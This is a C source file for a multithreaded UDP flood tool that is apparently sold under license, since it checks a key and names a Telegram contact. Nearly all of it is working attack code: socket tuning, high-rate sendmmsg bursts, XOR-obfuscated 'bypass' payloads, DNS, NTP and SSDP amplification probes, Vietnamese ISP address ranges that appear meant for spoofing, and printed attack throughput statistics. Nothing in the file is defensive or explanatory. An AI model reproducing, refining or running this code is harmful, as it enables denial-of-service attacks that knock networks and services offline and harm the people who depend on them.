#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/mman.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/sysinfo.h>

#define PAYLOAD_SIZE 1472
#define BURST_SIZE 512
#define SOCKETS_PER_THREAD 8
#define SOCKET_BUFFER_SIZE (32 * 1024 * 1024)

typedef struct {
    uint32_t start;
    uint32_t end;
    const char *isp;
} vn_ip_range_t;

vn_ip_range_t vietnam_ip_ranges[] = {
    {0x0E2C0000, 0x0E2FFFFF, "VNPT"}, {0x0E3C0000, 0x0E3FFFFF, "VNPT"},
    {0x1B480000, 0x1B4FFFFF, "VNPT"}, {0x71C00000, 0x71FFFFFF, "VNPT"},
    {0x7B800000, 0x7BBFFFFF, "VNPT"}, {0x0E000000, 0x0E0FFFFF, "Viettel"},
    {0x1B000000, 0x1B3FFFFF, "Viettel"}, {0x74C00000, 0x74FFFFFF, "Viettel"},
    {0x7D800000, 0x7DBFFFFF, "Viettel"}, {0x0E100000, 0x0E1FFFFF, "FPT"},
    {0x2A000000, 0x2A3FFFFF, "FPT"}, {0x76000000, 0x763FFFFF, "FPT"},
    {0xD2B00000, 0xD2BFFFFF, "FPT"}
};

typedef struct {
    char pattern[64];
    int length;
} bypass_pattern_t;

bypass_pattern_t bypass_patterns[] = {
    {{"\xc0\xaf"}, 2}, {{"\xe0\x80\xaf"}, 3}, {{"\xf0\x80\x80\xaf"}, 4},
    {{"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65"}, 11},
    {{"\x00\x00\x10\x00\x00\x00\x00\x00"}, 8}, {{"\x17\x00\x03\x2a"}, 4},
    {{"\x00\x01\x00\x00\x00\x01\x00\x00\x67\x65\x74\x73"}, 12},
    {{"\x0d\x0a"}, 2}, {{"\x00"}, 1}, {{"\xff\xfe"}, 2}
};

typedef struct {
    const char *name;
    int port;
    const char *payload;
    int payload_len;
    int amplification_factor;
} amplification_vector_t;

amplification_vector_t amp_vectors[] = {
    {"DNS", 53, "\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01", 32, 50},
    {"NTP", 123, "\x17\x00\x03\x2a\x00\x00\x00\x00", 8, 556},
    {"SSDP", 1900, "M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:ssdp:all\r\nMAN:\"ssdp:discover\"\r\nMX:3\r\n\r\n", 92, 30}
};

typedef struct {
    char ip_dest[64];
    int port;
    int duration;
    int threads;
} config_t;

typedef struct {
    config_t *cfg;
    int thread_id;
    int cpu_id;
    uint64_t packets_sent;
    uint64_t bytes_sent;
} thread_arg_t;

typedef struct __attribute__((aligned(64))) {
    struct mmsghdr msgs[BURST_SIZE];
    struct iovec iovecs[BURST_SIZE];
    char *buffers[BURST_SIZE];
    struct sockaddr_in addr;
    int socks[SOCKETS_PER_THREAD];
    int current_sock;
    int pattern_index;
} thread_data_t;

char *rhexstring[] = {
    "\x00", "\x01", "\x02", "\x03", "\x04", "\x05", "\x06", "\x07",
    "\x08", "\x09", "\x0a", "\x0b", "\x0c", "\x0d", "\x0e", "\x0f",
    "\x10", "\x11", "\x12", "\x13", "\x14", "\x15", "\x16", "\x17",
    "\x18", "\x19", "\x1a", "\x1b", "\x1c", "\x1d", "\x1e", "\x1f",
    "\x20", "\x21", "\x22", "\x23", "\x24", "\x25", "\x26", "\x27",
    "\x28", "\x29", "\x2a", "\x2b", "\x2c", "\x2d", "\x2e", "\x2f",
    "\x30", "\x31", "\x32", "\x33", "\x34", "\x35", "\x36", "\x37",
    "\x38", "\x39", "\x3a", "\x3b", "\x3c", "\x3d", "\x3e", "\x3f",
    "\x40", "\x41", "\x42", "\x43", "\x44", "\x45", "\x46", "\x47",
    "\x48", "\x49", "\x4a", "\x4b", "\x4c", "\x4d", "\x4e", "\x4f",
    "\x50", "\x51", "\x52", "\x53", "\x54", "\x55", "\x56", "\x57",
    "\x58", "\x59", "\x5a", "\x5b", "\x5c", "\x5d", "\x5e", "\x5f",
    "\x60", "\x61", "\x62", "\x63", "\x64", "\x65", "\x66", "\x67",
    "\x68", "\x69", "\x6a", "\x6b", "\x6c", "\x6d", "\x6e", "\x6f",
    "\x70", "\x71", "\x72", "\x73", "\x74", "\x75", "\x76", "\x77",
    "\x78", "\x79", "\x7a", "\x7b", "\x7c", "\x7d", "\x7e", "\x7f",
    "\x80", "\x81", "\x82", "\x83", "\x84", "\x85", "\x86", "\x87",
    "\x88", "\x89", "\x8a", "\x8b", "\x8c", "\x8d", "\x8e", "\x8f",
    "\x90", "\x91", "\x92", "\x93", "\x94", "\x95", "\x96", "\x97",
    "\x98", "\x99", "\x9a", "\x9b", "\x9c", "\x9d", "\x9e", "\x9f",
    "\xa0", "\xa1", "\xa2", "\xa3", "\xa4", "\xa5", "\xa6", "\xa7",
    "\xa8", "\xa9", "\xaa", "\xab", "\xac", "\xad", "\xae", "\xaf",
    "\xb0", "\xb1", "\xb2", "\xb3", "\xb4", "\xb5", "\xb6", "\xb7",
    "\xb8", "\xb9", "\xba", "\xbb", "\xbc", "\xbd", "\xbe", "\xbf",
    "\xc0", "\xc1", "\xc2", "\xc3", "\xc4", "\xc5", "\xc6", "\xc7",
    "\xc8", "\xc9", "\xca", "\xcb", "\xcc", "\xcd", "\xce", "\xcf",
    "\xd0", "\xd1", "\xd2", "\xd3", "\xd4", "\xd5", "\xd6", "\xd7",
    "\xd8", "\xd9", "\xda", "\xdb", "\xdc", "\xdd", "\xde", "\xdf",
    "\xe0", "\xe1", "\xe2", "\xe3", "\xe4", "\xe5", "\xe6", "\xe7",
    "\xe8", "\xe9", "\xea", "\xeb", "\xec", "\xed", "\xee", "\xef",
    "\xf0", "\xf1", "\xf2", "\xf3", "\xf4", "\xf5", "\xf6", "\xf7",
    "\xf8", "\xf9", "\xfa", "\xfb", "\xfc", "\xfd", "\xfe", "\xff"
};

uint32_t get_random_vietnam_ip() {
    int range_idx = rand() % (sizeof(vietnam_ip_ranges) / sizeof(vn_ip_range_t));
    vn_ip_range_t *range = &vietnam_ip_ranges[range_idx];
    uint32_t ip = range->start + (rand() % (range->end - range->start + 1));
    return htonl(ip);
}

int get_cpu_cores() {
    int cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (cores < 1) cores = 1;
    printf("[*] Detected %d CPU cores\n", cores);
    return cores;
}

long get_system_memory() {
    struct sysinfo info;
    sysinfo(&info);
    long total_ram = info.totalram / (1024 * 1024);
    printf("[*] System RAM: %ld MB\n", total_ram);
    return total_ram;
}

int create_optimized_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return -1;
    
    int sndbuf = SOCKET_BUFFER_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
    
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    int priority = 6;
    setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));
    
    int nodelay = 1;
    setsockopt(sock, IPPROTO_IP, IP_TOS, &nodelay, sizeof(nodelay));
    
    return sock;
}

void encrypt_payload(unsigned char *buffer, int len, uint8_t key) {
    for (int i = 0; i < len; i++) {
        buffer[i] ^= key;
        key = (key + 1) % 256;
    }
}

void obfuscate_payload(unsigned char *buffer, int len) {
    for (int i = 0; i < len; i++) {
        buffer[i] = (buffer[i] << 4) | (buffer[i] >> 4);
    }
}

void generate_layer7_payload(unsigned char *buffer) {
    sprintf((char*)buffer, "GET /%d HTTP/1.1\r\nHost: %d.%d.%d.%d\r\n\r\n", 
            rand(), rand()%255, rand()%255, rand()%255, rand()%255);
}

void generate_payload(unsigned char *buffer, int pattern_idx) {
    int offset = 0;
    if (pattern_idx < sizeof(bypass_patterns) / sizeof(bypass_pattern_t)) {
        memcpy(buffer, bypass_patterns[pattern_idx].pattern, 
               bypass_patterns[pattern_idx].length);
        offset = bypass_patterns[pattern_idx].length;
    }
    
    for (int i = offset; i < PAYLOAD_SIZE; i++) {
        buffer[i] = rhexstring[i % 256][0];
        if (i % 64 == 0) buffer[i] = rand() % 256;
    }
    
    if (rand() % 2) generate_layer7_payload(buffer);
    
    encrypt_payload(buffer, PAYLOAD_SIZE, rand() % 256);
    obfuscate_payload(buffer, PAYLOAD_SIZE);
}

thread_data_t* init_thread_data(config_t *cfg) {
    thread_data_t *data = aligned_alloc(64, sizeof(thread_data_t));
    if (!data) return NULL;
    
    memset(data, 0, sizeof(thread_data_t));
    
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        data->socks[i] = create_optimized_socket();
        if (data->socks[i] < 0) {
            for (int j = 0; j < i; j++) close(data->socks[j]);
            free(data);
            return NULL;
        }
    }
    
    data->addr.sin_family = AF_INET;
    data->addr.sin_port = htons(cfg->port);
    inet_pton(AF_INET, cfg->ip_dest, &data->addr.sin_addr);
    
    for (int i = 0; i < BURST_SIZE; i++) {
        data->buffers[i] = aligned_alloc(64, PAYLOAD_SIZE);
        if (!data->buffers[i]) {
            for (int j = 0; j < i; j++) free(data->buffers[j]);
            for (int j = 0; j < SOCKETS_PER_THREAD; j++) close(data->socks[j]);
            free(data);
            return NULL;
        }
        
        generate_payload((unsigned char*)data->buffers[i], i % (sizeof(bypass_patterns) / sizeof(bypass_pattern_t)));
        
        data->iovecs[i].iov_base = data->buffers[i];
        data->iovecs[i].iov_len = PAYLOAD_SIZE;
        
        data->msgs[i].msg_hdr.msg_name = &data->addr;
        data->msgs[i].msg_hdr.msg_namelen = sizeof(data->addr);
        data->msgs[i].msg_hdr.msg_iov = &data->iovecs[i];
        data->msgs[i].msg_hdr.msg_iovlen = 1;
        data->msgs[i].msg_hdr.msg_control = NULL;
        data->msgs[i].msg_hdr.msg_controllen = 0;
        data->msgs[i].msg_hdr.msg_flags = 0;
    }
    
    return data;
}

void* flood_worker(void *arg) {
    thread_arg_t *targ = (thread_arg_t *)arg;
    config_t *cfg = targ->cfg;
    time_t end_time = time(NULL) + cfg->duration;
    
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(targ->cpu_id, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    thread_data_t *data = init_thread_data(cfg);
    if (!data) {
        printf("[ERROR] Thread %d: Failed to initialize\n", targ->thread_id);
        return NULL;
    }
    
    printf("[+] Thread %d started on CPU %d\n", targ->thread_id, targ->cpu_id);
    
    while (time(NULL) < end_time) {
        for (int i = 0; i < BURST_SIZE; i++) {
            generate_payload((unsigned char*)data->buffers[i], data->pattern_index);
            data->pattern_index = (data->pattern_index + 1) % (sizeof(bypass_patterns) / sizeof(bypass_pattern_t));
        }
        
        int sent = sendmmsg(data->socks[data->current_sock], data->msgs, BURST_SIZE, 0);
        if (sent > 0) {
            targ->packets_sent += sent;
            targ->bytes_sent += sent * PAYLOAD_SIZE;
        } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
            usleep(10);
        }
        
        data->current_sock = (data->current_sock + 1) % SOCKETS_PER_THREAD;
        
        if (rand() % 3 == 0) {
            int amp_idx = rand() % (sizeof(amp_vectors) / sizeof(amplification_vector_t));
            data->addr.sin_port = htons(amp_vectors[amp_idx].port);
            for (int i = 0; i < BURST_SIZE; i++) {
                memcpy(data->buffers[i], amp_vectors[amp_idx].payload, amp_vectors[amp_idx].payload_len);
                data->iovecs[i].iov_len = amp_vectors[amp_idx].payload_len;
            }
            sendmmsg(data->socks[data->current_sock], data->msgs, BURST_SIZE, 0);
            data->addr.sin_port = htons(cfg->port);
            for (int i = 0; i < BURST_SIZE; i++) {
                data->iovecs[i].iov_len = PAYLOAD_SIZE;
            }
        }
    }
    
    for (int i = 0; i < BURST_SIZE; i++) free(data->buffers[i]);
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) close(data->socks[i]);
    free(data);
    
    printf("[+] Thread %d finished\n", targ->thread_id);
    return NULL;
}

volatile int running = 1;
void signal_handler(int sig) {
    running = 0;
    printf("\n[!] Stopping...\n");
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <KEY>\n", argv[0]);
        return 1;
    }
    
    // Validate key
    const char *expected_key = "69621dd1f774f908037fbf2a065dc6f1";
    if (strcmp(argv[4], expected_key) != 0) {
        printf("Wrong key please contact telegram : @chuongsex\n");
        return 1;
    }
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    config_t cfg;
    strncpy(cfg.ip_dest, argv[1], sizeof(cfg.ip_dest) - 1);
    cfg.port = atoi(argv[2]);
    cfg.duration = atoi(argv[3]);
    cfg.threads = get_cpu_cores();
    
    get_system_memory();
    printf("[*] Attacking %s:%d for %d seconds with %d threads\n", 
           cfg.ip_dest, cfg.port, cfg.duration, cfg.threads);
    
    pthread_t *threads = malloc(sizeof(pthread_t) * cfg.threads);
    thread_arg_t *args = malloc(sizeof(thread_arg_t) * cfg.threads);
    
    for (int i = 0; i < cfg.threads; i++) {
        args[i].cfg = &cfg;
        args[i].thread_id = i;
        args[i].cpu_id = i % get_cpu_cores();
        args[i].packets_sent = 0;
        args[i].bytes_sent = 0;
        pthread_create(&threads[i], NULL, flood_worker, &args[i]);
    }
    
    uint64_t total_packets = 0, total_bytes = 0;
    for (int i = 0; i < cfg.threads; i++) {
        pthread_join(threads[i], NULL);
        total_packets += args[i].packets_sent;
        total_bytes += args[i].bytes_sent;
    }
    
    printf("[*] Attack finished: %lu packets sent, %lu bytes sent\n", total_packets, total_bytes);
    printf("[*] Average Speed: %.2f Gbps\n", (double)(total_bytes * 8) / (1000 * 1000 * 1000) / cfg.duration);
    printf("[*] Average PPS: %.2f\n", (double)total_packets / cfg.duration);
    
    free(threads);
    free(args);
    return 0;
}